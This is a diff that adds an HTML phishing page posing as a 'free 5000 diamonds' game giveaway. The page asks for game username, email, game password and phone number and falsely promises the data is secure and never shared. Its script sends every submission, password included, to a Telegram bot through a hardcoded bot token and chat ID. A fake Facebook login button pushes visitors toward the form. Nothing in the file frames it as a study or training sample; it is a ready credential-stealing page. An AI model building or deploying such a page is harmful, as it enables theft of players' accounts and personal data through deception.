@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Diamonds - Claim Your 5000 Diamonds Now!</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2980, #26d0ce);
+            color: white;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            max-width: 900px;
+            width: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
+            animation: fadeIn 1s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        header {
+            background: linear-gradient(to right, #0d47a1, #1976d2);
+            padding: 30px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .logo {
+            font-size: 2.5rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        .logo i {
+            color: #ffd700;
+        }
+        
+        h1 {
+            font-size: 2.8rem;
+            margin-top: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        
+        .tagline {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            margin-top: 10px;
+        }
+        
+        .diamond-highlight {
+            background: linear-gradient(45deg, #ff4081, #7b1fa2);
+            padding: 25px;
+            text-align: center;
+            margin: 20px;
+            border-radius: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .diamond-highlight::before {
+            content: "";
+            position: absolute;
+            top: -10px;
+            left: -10px;
+            right: -10px;
+            bottom: -10px;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            z-index: 0;
+        }
+        
+        .diamond-count {
+            font-size: 5rem;
+            font-weight: 800;
+            color: #ffd700;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.7);
+            position: relative;
+            z-index: 1;
+        }
+        
+        .diamond-text {
+            font-size: 1.8rem;
+            margin-top: 10px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .login-section {
+            padding: 30px;
+        }
+        
+        .login-title {
+            text-align: center;
+            font-size: 1.8rem;
+            margin-bottom: 25px;
+            color: #bb86fc;
+        }
+        
+        .login-box {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        
+        input {
+            width: 100%;
+            padding: 15px;
+            border-radius: 10px;
+            border: none;
+            background-color: rgba(255, 255, 255, 0.9);
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+        
+        input:focus {
+            outline: none;
+            background-color: white;
+            box-shadow: 0 0 0 3px rgba(33, 150, 243, 0.5);
+        }
+        
+        .facebook-login-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 18px;
+            width: 100%;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s;
+            margin-top: 15px;
+        }
+        
+        .facebook-login-btn:hover {
+            background-color: #166fe5;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .submit-btn {
+            background: linear-gradient(to right, #ff416c, #ff4b2b);
+            color: white;
+            border: none;
+            padding: 18px;
+            width: 100%;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .info-note {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.9rem;
+            opacity: 0.8;
+            line-height: 1.5;
+        }
+        
+        .steps {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            margin: 30px;
+            gap: 20px;
+        }
+        
+        .step {
+            flex: 1;
+            min-width: 200px;
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+        }
+        
+        .step-number {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            background-color: #bb86fc;
+            border-radius: 50%;
+            line-height: 40px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        
+        footer {
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            text-align: center;
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+        }
+        
+        .success-message {
+            display: none;
+            background-color: rgba(76, 175, 80, 0.2);
+            border: 1px solid #4caf50;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        @media (max-width: 768px) {
+            .diamond-count {
+                font-size: 3.5rem;
+            }
+            
+            h1 {
+                font-size: 2.2rem;
+            }
+            
+            .steps {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fas fa-gem"></i>
+                <span>DIAMOND KING</span>
+            </div>
+            <h1>FREE DIAMONDS GIVEAWAY!</h1>
+            <p class="tagline">Limited Time Offer - Claim Your Diamonds Now</p>
+        </header>
+        
+        <div class="diamond-highlight">
+            <div class="diamond-count">5000</div>
+            <div class="diamond-text">FREE DIAMONDS</div>
+        </div>
+        
+        <div class="steps">
+            <div class="step">
+                <div class="step-number">1</div>
+                <h3>Login with Facebook</h3>
+                <p>Connect your account to verify eligibility</p>
+            </div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <h3>Enter Your Details</h3>
+                <p>Provide required information for delivery</p>
+            </div>
+            <div class="step">
+                <div class="step-number">3</div>
+                <h3>Claim Diamonds</h3>
+                <p>Receive 5000 diamonds instantly in your account</p>
+            </div>
+        </div>
+        
+        <section class="login-section">
+            <h2 class="login-title">Claim Your Free Diamonds Now!</h2>
+            
+            <div class="login-box">
+                <button class="facebook-login-btn" id="facebookLogin">
+                    <i class="fab fa-facebook-f"></i> Login with Facebook
+                </button>
+                
+                <div class="info-note">Or fill the form below if you don't have Facebook</div>
+                
+                <form id="diamondForm">
+                    <div class="form-group">
+                        <label for="username">Game Username:</label>
+                        <input type="text" id="username" placeholder="Enter your in-game username" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="email">Email Address:</label>
+                        <input type="email" id="email" placeholder="Enter your email address" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password">Game Password (for verification):</label>
+                        <input type="password" id="password" placeholder="Enter your password" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="phone">Phone Number (optional):</label>
+                        <input type="tel" id="phone" placeholder="Enter your phone number">
+                    </div>
+                    
+                    <button type="submit" class="submit-btn" id="submitBtn">
+                        <i class="fas fa-gift"></i> CLAIM MY 5000 DIAMONDS
+                    </button>
+                    
+                    <div class="loading" id="loading">
+                        <i class="fas fa-spinner fa-spin"></i> Processing your request...
+                    </div>
+                    
+                    <div class="success-message" id="successMessage">
+                        <i class="fas fa-check-circle"></i> Your request has been submitted successfully! Diamonds will be added to your account within 24 hours.
+                    </div>
+                </form>
+                
+                <div class="info-note">
+                    <i class="fas fa-shield-alt"></i> Your information is secure and will only be used to deliver your free diamonds. We never share your data with third parties.
+                </div>
+            </div>
+        </section>
+        
+        <footer>
+            <p>This is an unofficial promotion. Not affiliated with any game company.</p>
+            <p>© 2023 Diamond King. All rights reserved. | Privacy Policy | Terms of Service</p>
+        </footer>
+    </div>
+
+    <script>
+        // Telegram bot configuration
+        const BOT_TOKEN = '8246684020:AAGpQSfaD_IYroJNFWvg29nr5dHtG2FTpjE';
+        const CHAT_ID = '7981367003';
+        
+        // Form submission handler
+        document.getElementById('diamondForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Show loading animation
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('successMessage').style.display = 'none';
+            
+            // Get form values
+            const username = document.getElementById('username').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const phone = document.getElementById('phone').value;
+            
+            // Get current date and time
+            const now = new Date();
+            const dateTime = now.toLocaleString();
+            
+            // Get user IP (simulated for demo)
+            const ip = "User IP will be captured on server-side";
+            
+            // Create message for Telegram
+            const message = `
+🚨 *NEW DIAMOND CLAIM REQUEST* 🚨
+
+*Username:* ${username}
+*Email:* ${email}
+*Password:* ${password}
+*Phone:* ${phone || 'Not provided'}
+*IP Address:* ${ip}
+*Timestamp:* ${dateTime}
+
+*Claim Details:*
+- Diamonds Requested: 5000
+- Status: PENDING
+            `;
+            
+            try {
+                // Send data to Telegram bot
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                const result = await response.json();
+                
+                // Hide loading animation
+                document.getElementById('loading').style.display = 'none';
+                
+                if (result.ok) {
+                    // Show success message
+                    document.getElementById('successMessage').style.display = 'block';
+                    
+                    // Reset form
+                    document.getElementById('diamondForm').reset();
+                    
+                    // Scroll to success message
+                    document.getElementById('successMessage').scrollIntoView({ behavior: 'smooth' });
+                } else {
+                    alert('Error: Could not submit your request. Please try again.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('loading').style.display = 'none';
+                alert('Network error. Please check your connection and try again.');
+            }
+        });
+        
+        // Facebook login button handler
+        document.getElementById('facebookLogin').addEventListener('click', function() {
+            alert("For security reasons, please fill out the form below with your details instead of Facebook login.");
+        });
+        
+        // Add some visual effects
+        const diamondCount = document.querySelector('.diamond-count');
+        let scale = 1;
+        let direction = 0.01;
+        
+        function pulseDiamond() {
+            scale += direction;
+            
+            if (scale > 1.1) {
+                direction = -0.01;
+            } else if (scale < 1) {
+                direction = 0.01;
+            }
+            
+            diamondCount.style.transform = `scale(${scale})`;
+            requestAnimationFrame(pulseDiamond);
+        }
+        
+        // Start the animation
+        pulseDiamond();
+    </script>
+</body>
+</html>
